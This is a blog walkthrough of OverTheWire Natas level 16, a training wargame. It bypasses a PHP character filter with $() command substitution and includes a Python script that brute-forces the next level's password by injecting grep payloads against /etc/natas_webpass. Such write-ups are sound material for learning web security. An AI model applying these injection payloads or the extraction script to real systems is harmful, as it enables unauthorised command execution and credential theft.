---
title: Over The Wire Natas - Level 16 Solution
tags: [WebExploitation, OverTheWire, Walkthrough, Natas, Injection]
---

In this post we will tackle Level 16 of the OverTheWire Natas Games.

This is a modified version of older level with more checks in place. The approach could be similar to that of the last level.

<!--more-->

# What do we know

What all things does the hint or the View Source tells us:

`For security reasons, we now filter even more on certain characters`

okay so what are the filtered ones.

```
if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
```

so from here we can see that ;|&`\'" are all not allowed.

the other thing to note here is the `\"$key\"` in the grep command. This means that the $key value is treated in together so that our previous command - `.* /etc/natas_webpass/natas11`

would fail here since all of this becomes a single string. And this entire thing is now being searched in dictionary.txt

# How to Solve this 

Since `$()` are not in the blocked list, we should be able to perform command substitution i.e execute the command and put its output. 

so in bash if we do.
`$(ls)` -> this will execute ls and put its output in here.

with this information, we should be now able to search for the string that we want in the `/etc/natas_webpass/natas17` file. example `$(grep a /etc/natas_webpass/natas17)` so if the a is there in the password it will output it, if its not there it will not output anything. 

So how do we tie this logic here.

lets search for `africa` or any other word that is in the dictionary.txt file, we get for this query - `http://natas16.natas.labs.overthewire.org/?needle=africa&submit=Search` 
African and Africans.

Now lets try our  query with `$(grep a /etc/natas_webpass/natas17)africa` This returns us same result as above, signaling that the character 'a' is not present in the password. 

If this would have been present then the query would have been the entire password plus Africa which it would never be present in the dictionary.txt file and it will return empty.

example since we know that `X` is in the password latter on doing this query `$(grep X /etc/natas_webpass/natas17)africa` returns in an empty output. 

Well how do we know this, its basically trial and error.

To better explain this lets look at the code below.

```
csp@cybersecpandit:~/GIT/tmp$ cat test_file
12321341aaabcde
csp@cybersecpandit:~/GIT/tmp$ grep x test_file   -> This returned Empty
csp@cybersecpandit:~/GIT/tmp$ grep b test_file   -> Match is there the entire line is returned.
12321341aaabcde

```

so if the password file contians b it would have returned the line and the final query would have been 12321341aaabcdeAfrica which is not in the dictionary.txt

With this knowledge lets start writing a script.

# Main Code Snippet

How do we brute force the entire password - simple we first try with a single character lets say y and if a match is found, then we try with each of the char in the set and try to append it in left as well as right side. 

example:
y -> Found
ay -> Not Found 
ya -> Not Found 
by -> Not Found
yb -> Found.
ayb -> Not found.

and so on and so forth. Why do we need to try both sides, since the first character that we search for could be anywhere in the password.

```python
while (len(brute_pwd) != 32):
    for each_char in characters:
        left_side = each_char + brute_pwd
        right_side = brute_pwd + each_char
        payload_left = "$(grep " + left_side + " /etc/natas_webpass/natas17)Africa"
        payload_right = "$(grep " + right_side + " /etc/natas_webpass/natas17)Africa"

        complete_url_left = url + "/?needle=" + payload_left + "&submit=Search"
        complete_url_right = url + "/?needle=" + payload_right + "&submit=Search"
        
        # Try Left First
        response = session.get(complete_url_left,
            auth=(present_user, present_level_15_pwd)
        )
        response_content = response.text
        if ('Africa' not in response_content):
            brute_pwd = left_side
            # found it - lets break and continue searching.
            break
        else:
            # Try the right side now
            response = session.get(complete_url_right,
                                    auth=(present_user, present_level_15_pwd)
                                    )
            response_content = response.text
            if ('Africa' not in response_content):
                brute_pwd = right_side
                break

```

# Alternate approach 

There could be other ways to get this done for example using other commands instead of grep, that is left as an excersise to the reader.

# Continue Learning 

If you are able to understand Nepali Language, then perhaps you could also enjoy the YouTube Playlist that I have made for this topic going in Depth in each of the Levels.
